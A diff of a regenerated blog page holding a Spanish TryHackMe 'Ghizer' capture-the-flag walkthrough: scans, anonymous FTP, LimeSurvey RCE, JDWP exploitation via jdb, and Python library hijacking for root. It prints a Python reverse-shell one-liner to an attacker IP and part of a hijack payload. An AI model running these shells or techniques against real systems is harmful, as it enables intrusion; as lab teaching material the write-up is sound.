@@ -18,9 +18,9 @@
 
 <script defer src="/js/lazysizes.min.31dd6a2d3a1ec0f78a8df007535cf23f03aeb5c70f026e6d6a19dac3b3acc340.js"></script>
 
-<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
+<script defer src="/js/helper/getParents.min.ccd45f158c1b17849307ba913a72beac239c410f2b6e648496a79842da84e55b.js"></script>
 
-<script defer src="/js/helper/fadeinout.min.93a331f96194789a542f33690bbe4f0c102c7e78ffc018217f5a1c33010bad91.js"></script>
+<script defer src="/js/helper/fadeinout.min.9fb19682560d5fa5596fffec85da605067c4acc86aad05add4d8fff9d362a446.js"></script>
 
 <script defer src="/js/helper/closest.min.js"></script>
   
@@ -1257,7 +1257,7 @@
     <meta property="twitter:description" content="Ghizer es una maquina de TryHackMe, encontramos un HoneyPot en el puerto FTP. Explotamos un RCE en LimeSurvey lo que nos dio acceso a la maquina. Encontramos JDWP el cual nos conectamos para obtener acceso al siguiente usuario. Tenemos permisos para ejecutar un script con Python3 al cual realizamos Python Library Hijacking para escalar privilegios.">
   
 
-<meta name="generator" content="Hugo 0.68.3" />
+<meta name="generator" content="Hugo 0.88.1" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1439,6 +1439,10 @@
             <a href="/categories/hackthebox">HackTheBox</a>
           </li>
         
+          <li class="navbarm__menu--item navbarm__menu--subitem">
+            <a href="/categories/cyberseclabs">CyberSecLabs</a>
+          </li>
+        
 
       
       
@@ -1529,6 +1533,8 @@
       
       <a href="/categories/hackthebox" class="navbar__dropdown--item" dir="ltr">HackTheBox</a>
       
+      <a href="/categories/cyberseclabs" class="navbar__dropdown--item" dir="ltr">CyberSecLabs</a>
+      
     </div>
   </div>
   
@@ -1575,35 +1581,40 @@
     <div class="single__meta">
       
 <div class="single__infos">
-  <time class="single__info" title="Written At">📅&nbsp;Sep 7, 2020 </time>
+  <time class="single__info" title="Written At">Sep 7, 2020 </time>
   
-  &nbsp;&middot;&nbsp; <span class="single__info" title="Reading Time"> ☕&nbsp;10&nbsp;min read </span>
   
-  &nbsp;&middot;&nbsp; <span class="single__info" title="WRITTEN BY">✍️&nbsp;sckull</span>
+
+  
+
+  
+  
+  &nbsp;•&nbsp; <span class="single__info" title="WRITTEN BY">✍️&nbsp;sckull</span>
   
   <span class="single__info">
     
   </span>
 </div>
+
       
 <ul class="single__tags caption">
   
   🏷️
   
 
+  <li><a href="https://sckull.github.io/tags/python-library-hijacking/" class="single__tag" title="python library hijacking">python library hijacking</a></li>
+  
+
   <li><a href="https://sckull.github.io/tags/ftp/" class="single__tag" title="ftp">ftp</a></li>
+  
+
+  <li><a href="https://sckull.github.io/tags/limesurvey/" class="single__tag" title="LimeSurvey">LimeSurvey</a></li>
   
 
   <li><a href="https://sckull.github.io/tags/ghidra/" class="single__tag" title="ghidra">ghidra</a></li>
   
 
-  <li><a href="https://sckull.github.io/tags/python-library-hijacking/" class="single__tag" title="python library hijacking">python library hijacking</a></li>
-  
-
   <li><a href="https://sckull.github.io/tags/jdb/" class="single__tag" title="jdb">jdb</a></li>
-  
-
-  <li><a href="https://sckull.github.io/tags/limesurvey/" class="single__tag" title="LimeSurvey">LimeSurvey</a></li>
   
 
 </ul>
@@ -1654,7 +1665,7 @@
 <p>Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80), ssl/https (443), servicio de java(?) (18002) y algunos otros puertos abiertos que no logramos obtener informacion.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">  1
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
 </span><span class="lnt">  2
 </span><span class="lnt">  3
 </span><span class="lnt">  4
@@ -1783,7 +1794,7 @@
 </span><span class="lnt">127
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-09-04 18:24 EDT
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-09-04 18:24 EDT
 Nmap scan report <span class="k">for</span> 10.10.26.105 <span class="o">(</span>10.10.26.105<span class="o">)</span>
 Host is up <span class="o">(</span>0.31s latency<span class="o">)</span>.
 Not shown: <span class="m">997</span> closed ports
@@ -1916,7 +1927,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p>Ingresamos por el servicio FTP con las credenciales de anonymous (anonymous:anonymous) en el cual encontramos varios archivos entre ellos las flag <code>root.txt</code> y <code>user.txt</code>, al intentar obtener uno de estos archivos muestra un mensaje de permiso denegado por lo que no logramos hacer nada en este servicio, además es muy raro porque comunmente es posible realizar <code>ls -lah</code> para observar los archivos ocultos, algo que no se pudo lograr en este servicio.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1952,7 +1963,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </span><span class="lnt">34
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/ghizer$ ftp ghizer.thm 
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/ghizer$ ftp ghizer.thm 
 Connected to ghizer.thm.
 <span class="m">220</span> Welcome to Anonymous FTP server <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
 Name <span class="o">(</span>ghizer.thm:kali<span class="o">)</span>: anonymous
@@ -1991,11 +2002,11 @@ kali@kali:~/thm/ghizer$
 </div><h1 id="http">HTTP</h1>
 <p>Encontramos una pagina web en el puerto 80, al parecer es una aplicacion web para realizar encuestas.<br />
 <img src="/images/posts/thm/ghizer/Screenshot_2020-08-14_02-30-16.png" alt="image" /></p>
-<h2 id="gobuster-">GOBUSTER</h2>
+<h2 id="gobuster">GOBUSTER</h2>
 <p>Utilizamos gobuster para busqueda de directorios y archivos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2013,7 +2024,7 @@ kali@kali:~/thm/ghizer$
 </span><span class="lnt">16
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/ghizer$ gobuster dir -u http://ghizer.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -t <span class="m">50</span> -x php,html,txt
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/ghizer$ gobuster dir -u http://ghizer.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -t <span class="m">50</span> -x php,html,txt
 /index.php <span class="o">(</span>Status: 200<span class="o">)</span>
 /docs <span class="o">(</span>Status: 301<span class="o">)</span>
 /themes <span class="o">(</span>Status: 301<span class="o">)</span>
@@ -2037,10 +2048,10 @@ kali@kali:~/thm/ghizer$
 <p>Actualizamos a una nueva shell en donde podamos realizar una enumeracion más comoda ejecutando una shell inversa de python.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">python -c <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.2.29.162&#34;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python -c <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.2.29.162&#34;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
 </code></pre></td></tr></table>
 </div>
 </div><h1 id="ghidra-rce---veronica">GHIDRA RCE -&gt; VERONICA</h1>
@@ -2052,7 +2063,7 @@ kali@kali:~/thm/ghizer$
 <p>Tenemos acceso al puerto (18001) localmente con la shell actual por lo que realizamos la explotacion como en la <a href="https://www.youtube.com/watch?v=N3VcWIUpgfE"><strong>demostracion de la exploitacion</strong></a>, a continuacion los comandos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -2061,7 +2072,7 @@ kali@kali:~/thm/ghizer$
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#Conexion a jdwp</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#Conexion a jdwp</span>
 jdb -attach localhost:18001
 <span class="c1">#Listar las clases disponibles</span>
 <span class="c1">#classpath</span>
@@ -2077,16 +2088,16 @@ print new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span
 <p>Hacemos una pequeña enumeracion en la carpeta principal de <code>veronica</code> y vemos un script en python el cual codifica el mensaje <code>tryhackme is the best</code> y además la variable podria darnos una pista de lo que debemos de hacer.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">base64</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">base64</span>
 
 <span class="n">hijackme</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;tryhackme is the best&#39;</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">hijackme</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">hijackme</span><span class="p">)</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>Además vemos un cron que ejecuta el usuario root.<br />
@@ -2096,7 +2107,7 @@ print new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span
 <p>Creamos el archivo <code>base64.py</code> en donde colocamos una shell inversa para realizar <a href="https://rastating.github.io/privilege-escalation-via-python-library-hijacking/"><strong>Python Library Hijacking</strong></a>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2125,7 +2136,7 @@ print new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span
 </span><span class="lnt">27
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python:base.py" data-lang="python:base.py"><span class="kn">import</span> <span class="nn">os</span>
+<pre tabindex="0" class="chroma"><code class="language-python:base.py" data-lang="python:base.py"><span class="kn">import</span> <span class="nn">os</span>
 <span class="kn">import</span> <span class="nn">pty</span>
 <span class="kn">import</span> <span class="nn">socket</span>
 
@@ -2157,27 +2168,27 @@ print new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span
 </div><p>Ejecutamos el script con python3 y sudo, ponemos a la escucha netcat en nuestra maquina y logramos obtener una shell con usuario root y nuestra flag <code>root.txt</code>.<br />
 <img src="/images/posts/thm/ghizer/Screenshot_2020-08-14_02-59-33.png" alt="image" /></p>
 <h1 id="anexo">ANEXO</h1>
-<h2 id="honeypot---ftp-">HONEYPOT - FTP</h2>
+<h2 id="honeypot---ftp">HONEYPOT - FTP</h2>
 <p>Al parecer el servicio FTP expuesto en la maquina es un honeypot llamado <a href="https://github.com/Kirari-Senpai/Lucrecia.git"><strong>Lucrecia</strong></a>.<br />
 <img src="/images/posts/thm/ghizer/Screenshot_2020-08-14_03-02-18.png" alt="image" /></p>
 <p>Además el cron que encontramos era para ejecutar el honeypot.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:/root/Lucrecia# cat lucre.sh
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:/root/Lucrecia# cat lucre.sh
 cat lucre.sh
 ufw disable
 sleep <span class="m">3</span>
 python3 lucrecia.py -f server.conf
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="task-1-">TASK 1</h2>
+</div><h2 id="task-1">TASK 1</h2>
 <p>Al obtener una shell es posible obtener las credenciales en &hellip;<br />
 <div class="alert alert-danger" role="alert" data-dir="ltr"><strong>SPOILER</strong></div>
 </p>
@@ -2192,7 +2203,7 @@ python3 lucrecia.py -f server.conf
     <p><code>limesurvey/application/config</code></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2263,7 +2274,7 @@ python3 lucrecia.py -f server.conf
 </span><span class="lnt">69
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">veronica@ubuntu:/var/www/html/limesurvey/application/config$ cat config.php
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">veronica@ubuntu:/var/www/html/limesurvey/application/config$ cat config.php
 cat config.php
 &lt;?php <span class="k">if</span> <span class="o">(</span>!defined<span class="o">(</span><span class="s1">&#39;BASEPATH&#39;</span><span class="o">))</span> exit<span class="o">(</span><span class="s1">&#39;No direct script access allowed&#39;</span><span class="o">)</span><span class="p">;</span>
 /*
@@ -2337,7 +2348,7 @@ cat config.php
 </div>
   </div>
 </div>
-<h2 id="task-2-">TASK 2</h2>
+<h2 id="task-2">TASK 2</h2>
 <p>En el puerto 443 o https encontramos un mensaje en el index, donde indica que la pagina del login de wordpress ha sido escondida con el plugin <code>WPS Hide Login</code> &hellip;<br />
 <div class="alert alert-danger" role="alert" data-dir="ltr"><strong>SPOILER</strong></div>
 </p>
@@ -2426,7 +2437,7 @@ cat config.php
       
     
       
-        <a href="https://twitter.com/intent/tweet?text=TryHackMe%20-%20Ghizer&url=https%3a%2f%2fsckull.github.io%2fposts%2fghizer%2f&hashtags=python%20library%20hijacking%2cftp%2cLimeSurvey%2cghidra%2cjdb&via=sckull" title="Twitter" aria-label="Twitter Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
+        <a href="https://twitter.com/intent/tweet?text=TryHackMe%20-%20Ghizer&url=https%3a%2f%2fsckull.github.io%2fposts%2fghizer%2f&hashtags=python%20library%20hijacking%2cftp%2cLimeSurvey%2cghidra%2cjdb&via=%40sckull_" title="Twitter" aria-label="Twitter Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
           <svg data-name="twitter" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m21.534 7.113c.976-.693 1.797-1.558 2.466-2.554v-.001c-.893.391-1.843.651-2.835.777 1.02-.609 1.799-1.566 2.165-2.719-.951.567-2.001.967-3.12 1.191-.903-.962-2.19-1.557-3.594-1.557-2.724 0-4.917 2.211-4.917 4.921 0 .39.033.765.114 1.122-4.09-.2-7.71-2.16-10.142-5.147-.424.737-.674 1.58-.674 2.487 0 1.704.877 3.214 2.186 4.089-.791-.015-1.566-.245-2.223-.606v.054c0 2.391 1.705 4.377 3.942 4.835-.401.11-.837.162-1.29.162-.315 0-.633-.018-.931-.084.637 1.948 2.447 3.381 4.597 3.428-1.674 1.309-3.8 2.098-6.101 2.098-.403 0-.79-.018-1.177-.067 2.18 1.405 4.762 2.208 7.548 2.208 8.683 0 14.342-7.244 13.986-14.637z"/></svg>
         </a>
       
@@ -2443,7 +2454,7 @@ cat config.php
     
     
       
-        <img data-src="/images/whoami/avatar.jpg" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" alt="sckull" class="lazyload whoami__image"/>
+        <img data-src="/images/whoami/avatar.jpg" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" alt="Dany Sucuc" class="lazyload whoami__image"/>
       
     
   </div>
@@ -2644,7 +2655,7 @@ cat config.php
 </div>
 
 
-<script defer src="/js/swipe.min.08ff2be1b74347bad9e267f732f1388d271b2f9d97b6a8a87bd6a510f17c5ad2.js"></script>
+<script defer src="/js/swipe.min.d70095d96ef6a016133ea2c732c5d4713539d335b739178e356af46f54cf0a16.js"></script>
 
 <script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
@@ -3746,6 +3757,11 @@ var a = document.getElementsByClassName('navbar__menu-item')
               THM: Ghizer
           </h6>
           
+          <label class="switch" data-ani="true">
+            <input id="visible-toc" aria-label="Visible TOC" type="checkbox" checked>
+            <span class="slider round"></span>
+          </label>
+          
         </div>
         <div class="toc toc__outer " data-dir="ltr" data-folding="false" data-ani="true">
           <nav id="TableOfContents">
@@ -3755,7 +3771,7 @@ var a = document.getElementsByClassName('navbar__menu-item')
     <li><a href="#ftp">FTP</a></li>
     <li><a href="#http">HTTP</a>
       <ul>
-        <li><a href="#gobuster-">GOBUSTER</a></li>
+        <li><a href="#gobuster">GOBUSTER</a></li>
       </ul>
     </li>
     <li><a href="#limesurvey---rce">LimeSurvey - RCE</a></li>
@@ -3763,9 +3779,9 @@ var a = document.getElementsByClassName('navbar__menu-item')
     <li><a href="#privilege-escalation">PRIVILEGE ESCALATION</a></li>
     <li><a href="#anexo">ANEXO</a>
       <ul>
-        <li><a href="#honeypot---ftp-">HONEYPOT - FTP</a></li>
-        <li><a href="#task-1-">TASK 1</a></li>
-        <li><a href="#task-2-">TASK 2</a></li>
+        <li><a href="#honeypot---ftp">HONEYPOT - FTP</a></li>
+        <li><a href="#task-1">TASK 1</a></li>
+        <li><a href="#task-2">TASK 2</a></li>
       </ul>
     </li>
   </ul>
